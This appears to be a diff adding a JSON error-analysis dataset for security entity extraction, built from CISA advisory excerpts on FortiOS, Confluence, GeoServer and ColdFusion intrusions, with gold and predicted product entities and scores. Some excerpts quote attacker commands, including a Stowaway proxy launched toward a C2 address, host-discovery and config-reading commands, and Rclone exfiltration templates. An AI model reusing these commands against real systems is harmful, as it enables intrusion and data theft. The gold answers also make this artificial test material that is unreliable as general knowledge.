+          "notes": "FortiOS 的正式 CPE 使用 part=o；a:fortinet:fortios 在当前 NVD CPE 检索中无匹配。",
+          "evidence": "CVE-2020-12812 is an improper authentication vulnerability in SSL VPN in FortiOS 6.4.0, 6.2.0 to 6.2.3, 6.0.9 and below that gives a user the ability to log in successfully without being prompted for "
+        },
+        {
+          "id": "E30",
+          "text": "FortiOS",
+          "type": "Configuration",
+          "start": 461,
+          "end": 468,
+          "normalized_id": "cpe:2.3:o:fortinet:fortios:*:*:*:*:*:*:*:*",
+          "evidence": "The alert highlighted three FortiOS vulnerabilities, all of which were previously known, and at least one of which (CVE-2018-13379) has been broadly exploited for more than 18 months.",
+          "notes": "FortiOS 的正式 CPE 使用 part=o；a:fortinet:fortios 在当前 NVD CPE 检索中无匹配。"
+        }
+      ]
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "Fortinet FortiOS",
+          "type": "Configuration",
+          "start": 311,
+          "end": 327,
+          "normalized_id": "cpe:2.3:o:fortinet:fortios:*:*:*:*:*:*:*:*",
+          "id": "E1"
+        },
+        {
+          "text": "FortiOS SSL VPNs",
+          "type": "Configuration",
+          "start": 2027,
+          "end": 2043,
+          "normalized_id": "cpe:2.3:a:fortinet:fortios_ssl_vpn:*:*:*:*:*:*:*:*",
+          "id": "E4"
+        },
+        {
+          "text": "SSL VPN in FortiOS 6.4.0, 6.2.0 to 6.2.3, 6.0.9 and below",
+          "type": "Configuration",
+          "start": 2539,
+          "end": 2596,
+          "normalized_id": "cpe:2.3:a:fortinet:fortios_ssl_vpn:*:*:*:*:*:*:*:*",
+          "id": "E8"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 3,
+      "strict_fn": 4,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- CISA = Cybersecurity and Infrastructure Security Agency\n- AS = Application Server\n- XXE = XML External Entity"
+    },
+    "parent_candidate_id": "P_E0"
+  },
+  {
+    "sample_id": "aa23-289a_w0",
+    "input_text": " To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact your local FBI field office or CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. SLTT organizations should report incidents to MS-ISAC (866-787-4722 or SOC@cisecurity.org). This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. For more information on the Traffic Light Protocol, see cisa.gov/tlp. TLP:CLEAR Product ID: AA23-289A October 16, 2023 Authored by: TLP:CLEAR Threat Actors Exploit Atlassian Confluence CVE-2023-22515 for Initial Access to Networks SUMMARY The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), and Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint Cybersecurity Advisory (CSA) in response to the active exploitation of CVE-2023-22515. This recently disclosed vulnerability affects certain versions of Atlassian Confluence Data Center and Server, enabling malicious cyber threat actors to obtain initial access to Confluence instances by creating unauthorized Confluence administrator accounts. Threat actors exploited CVE-2023-22515 as a zero- day to obtain access to victim systems and continue active exploitation post-patch. Atlassian has rated this vulnerability as critical; CISA, FBI, and MS-ISAC expect widespread, continued exploitation due to ease of exploitation. CISA, FBI, and MS-ISAC strongly encourage network administrators to immediately apply the upgrades provided by Atlassian. CISA, FBI, and MS-ISAC also encourage organizations to hunt for malicious activity on their networks using the detection signatures and indicators of compromise (IOCs) in this CSA. If a potential compromise is detected, organizations should apply the incident response recommendations. For additional information on upgrade instructions, a complete list of affected product versions, and IOCs, see Atlassian’s security advisory for CVE-2023-22515.[1] While Atlassian’s advisory provides interim measures to temporarily mitigate known attack vectors, CISA, FBI, and MS-ISAC strongly encourage upgrading to a fixed version or taking servers offline to apply necessary updates. ",
+    "gold_output": {
+      "entities": [
+        {
+          "id": "E1",
+          "text": "Atlassian Confluence",
+          "type": "Configuration",
+          "start": 1094,
+          "end": 1114,
+          "normalized_id": "cpe:2.3:a:atlassian:confluence:*:*:*:*:*:*:*:*",
+          "evidence": "TLP:CLEAR Product ID: AA23-289A October 16, 2023 Authored by: TLP:CLEAR Threat Actors Exploit Atlassian Confluence CVE-2023-22515 for Initial Access to Networks SUMMARY The Cybersecurity and Infrastructure Security Agency (CISA), Fede"
+        },
+        {
+          "id": "E16",
+          "text": "Atlassian Confluence Data Center and Server",
+          "type": "Configuration",
+          "start": 1513,
+          "end": 1556,
+          "normalized_id": "cpe:2.3:a:atlassian:confluence:*:*:*:*:*:*:*:*",
+          "evidence": "Atlassian Confluence Data Center and Server, enabling malicious cyber threat actors to obtain initial access to Confluence instances by creating unauthorized Confluence administrator accounts.",
+          "notes": "v4.5 human reannotation and adjudication"
+        }
+      ]
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "Atlassian Confluence Data Center and Server",
+          "type": "Configuration",
+          "start": 1513,
+          "end": 1556,
+          "normalized_id": "cpe:2.3:a:atlassian:confluence_data_center_and_server:*:*:*:*:*:*:*:*",
+          "id": "E3"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 1,
+      "strict_fp": 0,
+      "strict_fn": 1,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- CISA = Cybersecurity and Infrastructure Security Agency\n- FBI = Federal Bureau of Investigation\n- MS-ISAC = Multi-State Information Sharing and Analysis Center\n- CSA = Cybersecurity Advisory\n- IOCs = indicators of compromise\n- OWASP = Open Web Application Security Project\n- MFA = multifactor authentication\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- TTPs = tactics, techniques, and procedures\n- CSF = Cybersecurity Framework\n- CIS = Center for Internet Security’s"
+    },
+    "parent_candidate_id": "P_E0"
+  },
+  {
+    "sample_id": "aa25-266a_w7",
+    "input_text": "ccessfully establishing an outbound connection with their C2 server using HTTP over TCP/4441. On July 14, 2024, the cyber threat actors executed /tmp/mm.sh on the Web Server followed by an encoded command to execute Stowaway. The contents of this file could not be recovered. Additionally, they used Stowaway to establish a second C2 connection over TCP/50012, likely serving as a backup C2 channel. CISA discovered evidence of various files hosted on the C2 server, including numerous publicly available tools and scripts:  RingQ antivirus defense evasion tool (RingQ.exe, RingQ.rar)  IOX proxy tool (iox.rar)  BusyBox trojan multi-tool (busybox)  WinRAR archive tool (Rar.exe)  Stowaway proxy tool (agent, agent.tar, agent.zip, agentu.exe)  Web shells (Handx.ashx, start_tomcat.jsp)  Various shell scripts (mm.sh, t.py, t1.sh, c.bat) Detection The cyber threat actors remained undetected in the organization’s environment for three weeks before the organization’s SOC identified the compromise using their EDR tool. On July 31, 2024, their EDR tool identified a 1.txt file uploaded as suspected malware on the SQL Server. The SOC responded to additional alerts when the cyber threat actors transferred 1.txt to the SQL Server through bitsadmin after attempting other LOTL techniques, such as leveraging PowerShell and certutil. The alerts TLP:CLEAR CISA Page 10 of 19 | Product ID: AA25-266A TLP:CLEAR generated by this activity on the SQL server prompted the SOC to contain the server, initiate an investigation, request assistance from CISA, and uncover malicious activity on GeoServer 1. Lessons Learned CISA is sharing the following lessons learned based on what CISA learned about the organization’s security posture through incident detection and response activities. 1. Vulnerabilities were not promptly remediated. a. The cyber threat actors exploited CVE-2024-36401 for initial access on two GeoServers. b. The vulnerability was disclosed June 30, 2024, and the cyber threat actors exploited it for initial access to GeoServer 1 on July 11, 2024. c. The vulnerability was added to CISA’s KEV Catalog on July 15, 2024, and by July 24, 2024, the vulnerability was not patched when the cyber threat actors exploited it for access to GeoServer 2. i. Note: FCEB agencies are required to remediate vulnerabilities in CISA’s KEV Catalog within prescribed timeframes under Binding Operational Directive (BOD) 22-01. July 24, 2024, was within the KEV-required patching window for this CVE. However, CISA encourages FCEB agencies and critical infrastructure organizations to address KEV catalog vulnerabilities immediately as part of their vulnerability management plan. 2. The agency did not test or exercise their IRP, nor did their IRP enable them to promptly engage third parties and grant third parties’ access to necessary resources. a. On Aug. ",
+    "gold_output": {
+      "entities": []
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "GeoServers",
+          "type": "Configuration",
+          "start": 1910,
+          "end": 1920,
+          "normalized_id": null,
+          "id": "E2"
+        },
+        {
+          "text": "GeoServer 2",
+          "type": "Configuration",
+          "start": 2248,
+          "end": 2259,
+          "normalized_id": null,
+          "id": "E3"
+        },
+        {
+          "text": "BOD",
+          "type": "Configuration",
+          "start": 2414,
+          "end": 2417,
+          "normalized_id": null,
+          "id": "E4"
+        },
+        {
+          "text": "22-01",
+          "type": "Configuration",
+          "start": 2419,
+          "end": 2424,
+          "normalized_id": null,
+          "id": "E5"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 4,
+      "strict_fn": 0,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- TLP = Traffic Light Protocol\n- FCEB = federal civilian executive branch\n- EDR = endpoint detection and response\n- IRP = incident response plan\n- CISA = Cybersecurity and Infrastructure Security Agency\n- TTPs = tactics, techniques, and procedures\n- IOCs = indicators of compromise\n- SOC = security operations center\n- GeoServer = GeoServer 1\n- RCE = remote code execution\n- KEV = Known Exploited Vulnerabilities\n- GeoServer = GeoServer 2\n- SQL = Structured Query Language\n- LOTL = living off the land\n- VPS = virtual private server\n- BITS = Background Intelligence Transfer Service\n- SSH = Secure Shell\n- FTP = File Transfer Protocol\n- BOD = Binding Operational Directive\n- SIEM = security information and event management\n- RHEL = Red Hat Enterprise Linux\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- CMDB = configuration management database"
+    },
+    "parent_candidate_id": "P_E0"
+  },
+  {
+    "sample_id": "aa23-289a_w2",
+    "input_text": "xecuted through of a variety of techniques. A predominant method observed involves the use of cURL—a command line tool used to transfer data to or from a server. An additional data exfiltration technique observed includes use of Rclone [S1040]—a command line tool used to sync data to cloud and file hosting services such as Amazon Web Services and China-based UCloud Information Technology Limited. Note: This does not preclude the effectiveness of alternate methods, but highlights methods observed to date. Threat actors were observed using Rclone to either upload a configuration file to victim infrastructure or enter CISA  FBI | MS-ISAC TLP:CLEAR Page 3 of 6 | Product ID: AA23-289A TLP:CLEAR cloud storage credentials via the command line. Example configuration file templates are listed in the following Figures 1 and 2, which are populated with the credentials of the exfiltration point: Figure 1 Figure 2 The following User-Agent strings were observed in request headers. Note: As additional threat actors begin to use this CVE due to the availability of publicly posted proof-of-concept code, an increasing variation in User-Agent strings is expected. • Python-requests/2.27.1 • curl/7.88.1 Indicators of Compromise Disclaimer: Organizations are recommended to investigate or vet these IP addresses prior to taking action, such as blocking. [s3] type = env_auth = access_key_id = secret_access_key = region = endpoint = location_constraint = acl = server_side_encryption = storage_class = [minio] type = provider = env_auth = access_key_id = secret_access_key = endpoint = acl = CISA  FBI | MS-ISAC TLP:CLEAR Page 4 of 6 | Product ID: AA23-289A TLP:CLEAR The following IP addresses were obtained from FBI investigations as of October 2023 and observed conducting data exfiltration: • 170.106.106[.]16 • 43.130.1[.]222 • 152.32.207[.]23 • 199.19.110[.]14 • 95.217.6[.]16 (Note: This is the official rclone.org website) Additional IP addresses observed sending related exploit traffic have been shared by Microsoft.[3] DETECTION METHODS Network defenders are encouraged to review and deploy Proofpoint’s Emerging Threat signatures. See Ruleset Update Summary - 2023/10/12 - v10438.[4] Network defenders are also encouraged to aggregate application and server-level logging from Confluence servers to a logically separated log search and alerting system, as well as configure alerts for signs of exploitation (as detailed in Atlassian’s security advisory). INCIDENT RESPONSE Organizations are encouraged to review all affected Confluence instances for evidence of compromise, as outlined by Atlassian.[1] If compromise is suspected or detected, organizations should assume that threat actors hold full administrative access and can perform any number of unfettered actions—these include but are not limited to exfiltration of content and system credentials, as well as installation of malicious plugins. If a potential compromise is detected, organizations should: 1. ",
+    "gold_output": {
+      "entities": []
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "Confluence servers",
+          "type": "Configuration",
+          "start": 2289,
+          "end": 2307,
+          "normalized_id": "cpe:2.3:a:atlassian:confluence:*:*:*:*:*:*:*:*",
+          "id": "E1"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 1,
+      "strict_fn": 0,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- CISA = Cybersecurity and Infrastructure Security Agency\n- FBI = Federal Bureau of Investigation\n- MS-ISAC = Multi-State Information Sharing and Analysis Center\n- CSA = Cybersecurity Advisory\n- IOCs = indicators of compromise\n- OWASP = Open Web Application Security Project\n- MFA = multifactor authentication\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- TTPs = tactics, techniques, and procedures\n- CSF = Cybersecurity Framework\n- CIS = Center for Internet Security’s"
+    },
+    "parent_candidate_id": "P_E0"
+  },
+  {
+    "sample_id": "aa23-339a-coldfusion-cve-26360_w1",
+    "input_text": "c-facing web servers running outdated versions of Adobe ColdFusion.\nExecution: Command and Scripting Interpreter: JavaScript (T1059.007) - d.jsp is a RAT that utilizes a JavaScript loader to infect the device.\nPersistence: Server Software Component: Web Shell (T1505.003) - Threat actors uploaded various web shells to enable remote code execution and to execute commands on compromised web servers.\nPrivilege Escalation: Domain Policy Modification: Group Policy Modification (T1484.001) - Threat actors attempted to edit SYSVOL on an agency domain controller to change policies.\nDefense Evasion: Masquerading: Match Legitimate Name or Location (T1036.005); Masquerading: Masquerade File Type (T1036.008); Indicator Removal: File Deletion (T1070.004); Deobfuscate/Decode Files or Information (T1140) - Threat actors used certutil to decode web shells hidden inside .txt files; Hide Artifacts: Hidden Files and Directories (T1564.001).\nCredential Access: OS Credential Dumping: LSASS Memory (T1003.001); OS Credential Dumping: Security Account Manager (T1003.002).\nDiscovery: System Network Configuration Discovery: Internet Connection Discovery (T1016.001); Network Service Discovery (T1046); System Information Discovery (T1082); File and Directory Discovery (T1083); Account Discovery: Local Account (T1087.001); Account Discovery: Domain Account (T1087.002); Domain Trust Discovery (T1482); Software Discovery (T1518).\nCommand and Control: Application Layer Protocol: Web Protocols (T1071.001); Ingress Tool Transfer (T1105).\nReferenced tactics: Initial Access (TA0001), Execution (TA0002), Persistence (TA0003), Privilege Escalation (TA0004), Defense Evasion (TA0005), Credential Access (TA0006), Discovery (TA0007), Command and Control (TA0011).",
+    "gold_output": {
+      "entities": []
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "Adobe ColdFusion",
+          "type": "Configuration",
+          "start": 50,
+          "end": 66,
+          "normalized_id": "cpe:2.3:a:adobe:coldfusion:*:*:*:*:*:*:*:*",
+          "id": "E1"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 1,
+      "strict_fn": 0,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- CISA = Cybersecurity and Infrastructure Security Agency\n- FCEB = Federal Civilian Executive Branch\n- SAM = security account manager\n- LSASS = local security authority subsystem service"
+    },
+    "parent_candidate_id": "P_E0"
+  },
+  {
+    "sample_id": "aa25-266a_w6",
+    "input_text": "rs then attempted to brute force login credentials for the exploited web services to gain remote access, achieve RCE, or move laterally. The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal subnets using fscan. Their use of the -nobr and -nopoc flags for fscan indicated that this scan excluded brute forcing or vulnerability scanning, respectively. SQL Server CISA observed the following discovery commands on the organization’s SQL server:  whoami [T1033]  ipconfig /all  ping -n 1 8.8.8.8  systeminfo  tasklist [T1057]  dir c:\\ [T1083]  dir c:\\Users  type c:\\Last.txt  type c:\\inetpub\\wwwroot  type c:\\inetpub\\  dir c:\\inetpub\\wwwroot  dir c:\\  dir c:\\ifwapps  dir d:\\  dir e:\\  net group \"domain admins\" /domain  type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config  dir c:\\ifwapps\\Tier1Utilities  netstat -ano  curl  net user  tasklist GeoServer 2 Based on images CISA received of GeoServer 2, CISA observed the bash history of a user that showed the use of Burp Collaborator to execute encoded host and network discovery commands. TLP:CLEAR CISA Page 9 of 19 | Product ID: AA25-266A TLP:CLEAR Lateral Movement In one instance, the cyber threat actors moved laterally from the Web Server to the SQL Server by enabling xp_cmdshell for RCE on GeoServer 1. Command and Control The cyber threat actors used PowerShell [T1059.001] and bitsadmin getfile to download payloads [T1105]. They used Stowaway,4F5 a publicly available multi-level proxy tool, to establish C2 [T1090]. Stowaway enabled the cyber threat actors to bypass the organization’s intranet restrictions and access internal network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway to disk using a tomcat service account. The actors then executed Stowaway via /var/tmp/agent -c 45.32.22[.]62:4441 -s f86bc7ff68aff3ad –up http –reconnect 10. To test their level of access, the cyber threat actors performed a ping sweep of multiple hosts in a particular subnet of the organization’s network. Next, the cyber threat actors downloaded a modified version of Stowaway using a curl command, successfully establishing an outbound connection with their C2 server using HTTP over TCP/4441. On July 14, 2024, the cyber threat actors executed /tmp/mm.sh on the Web Server followed by an encoded command to execute Stowaway. The contents of this file could not be recovered. Additionally, they used Stowaway to establish a second C2 connection over TCP/50012, likely serving as a backup C2 channel. ",
+    "gold_output": {
+      "entities": []
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "GeoServer 1",
+          "type": "Configuration",
+          "start": 1328,
+          "end": 1339,
+          "normalized_id": null,
+          "id": "E6"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 1,
+      "strict_fn": 0,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- TLP = Traffic Light Protocol\n- FCEB = federal civilian executive branch\n- EDR = endpoint detection and response\n- IRP = incident response plan\n- CISA = Cybersecurity and Infrastructure Security Agency\n- TTPs = tactics, techniques, and procedures\n- IOCs = indicators of compromise\n- SOC = security operations center\n- GeoServer = GeoServer 1\n- RCE = remote code execution\n- KEV = Known Exploited Vulnerabilities\n- GeoServer = GeoServer 2\n- SQL = Structured Query Language\n- LOTL = living off the land\n- VPS = virtual private server\n- BITS = Background Intelligence Transfer Service\n- SSH = Secure Shell\n- FTP = File Transfer Protocol\n- BOD = Binding Operational Directive\n- SIEM = security information and event management\n- RHEL = Red Hat Enterprise Linux\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- CMDB = configuration management database"
+    },
+    "parent_candidate_id": "P_E0"
+  },
+  {
+    "sample_id": "aa25-266a_w9",
+    "input_text": "P addresses in this advisory were observed in August 2024, and some may be associated with legitimate activity. Organizations are encouraged to investigate the activity around these IP addresses prior to taking action, such as blocking. Activity should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors. Table 1. IOCs IOC Type Date Description 45.32.22[.]62 IPv4 Mid-July to early August 2024 C2 Server IP Address 45.17.43[.]250 IPv4 Mid-July to early August 2024 C2 Server IP Address 0777EA1D01DAD6DC261A6B602205E2C8 MD5 Mid-July to early August 2024 China Chopper Web Shell feda15d3509b210cb05eacc22485a78c MD5 Mid-July to early August 2024 Generic PHP Web Shell C9F4C41C195B25675BFA860EB9B45945 MD5 Mid-July to early August 2024 Linux Exploit CVE- 2016-5195 B7B3647E06F23B9E83D0B1CCE3E71642 MD5 Mid-July to early August 2024 Dirtycow 64e3a3458b3286caaac821c343d4b208 MD5 Mid-July to early August 2024 Stowaway Proxy Tool 20b70dac937377b6d0699a44721acd80 MD5 Mid-July to early August 2024 Unknown Downloaded Executable de778443619f37e2224898a9a800fa78 MD5 Mid-July to early August 2024 Unknown Downloaded Executable TLP:CLEAR CISA Page 12 of 19 | Product ID: AA25-266A TLP:CLEAR MITRE ATT&CK Tactics and Techniques See Table 2 through Table 11 for all referenced threat actor tactics and techniques. Table 2. Reconnaissance Technique Title ID Use Active Scanning: Vulnerability Scanning T1595.002 The cyber threat actors performed active scanning to identify vulnerabilities they could use for initial access. Table 3. Resource Development Technique Title ID Use Acquire Infrastructure: Virtual Private Server T1583.003 The cyber threat actors gained remote access to the victim’s network using a desktop behind a virtual private server (VPS). Table 4. Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 The cyber threat actors exploited CVE 2024-36401 on two of the organization’s public-facing GeoServers. Table 5. Execution Technique Title ID Use Command and Scripting Interpreter: PowerShell T1059.001 The cyber threat actors used PowerShell to download a payload. Table 6. Defense Evasion Technique Title ID Use Indirect Command Execution T1202 The cyber threat actors employed indirect command execution via web shells. Table 7. Persistence Technique Title ID Use BITS Jobs T1197 The cyber threat actors abused BITS jobs. TLP:CLEAR CISA Page 13 of 19 | Product ID: AA25-266A TLP:CLEAR Technique Title ID Use Scheduled Task/Job: Cron T1053.003 The cyber threat actors established persistence through cron jobs. Server Software Component: Web Shell T1505.003 The cyber threat actors uploaded web shells for persistence. Valid Accounts T1078 The cyber threat actors used valid accounts for persistence. Table 8. ",
+    "gold_output": {
+      "entities": []
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "GeoServers",
+          "type": "Configuration",
+          "start": 2012,
+          "end": 2022,
+          "normalized_id": "cpe:2.3:a:osgeo:geoserver:*:*:*:*:*:*:*:*",
+          "id": "E6"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 1,
+      "strict_fn": 0,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- TLP = Traffic Light Protocol\n- FCEB = federal civilian executive branch\n- EDR = endpoint detection and response\n- IRP = incident response plan\n- CISA = Cybersecurity and Infrastructure Security Agency\n- TTPs = tactics, techniques, and procedures\n- IOCs = indicators of compromise\n- SOC = security operations center\n- GeoServer = GeoServer 1\n- RCE = remote code execution\n- KEV = Known Exploited Vulnerabilities\n- GeoServer = GeoServer 2\n- SQL = Structured Query Language\n- LOTL = living off the land\n- VPS = virtual private server\n- BITS = Background Intelligence Transfer Service\n- SSH = Secure Shell\n- FTP = File Transfer Protocol\n- BOD = Binding Operational Directive\n- SIEM = security information and event management\n- RHEL = Red Hat Enterprise Linux\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- CMDB = configuration management database"
+    },
+    "parent_candidate_id": "P_E0"
+  }
+]
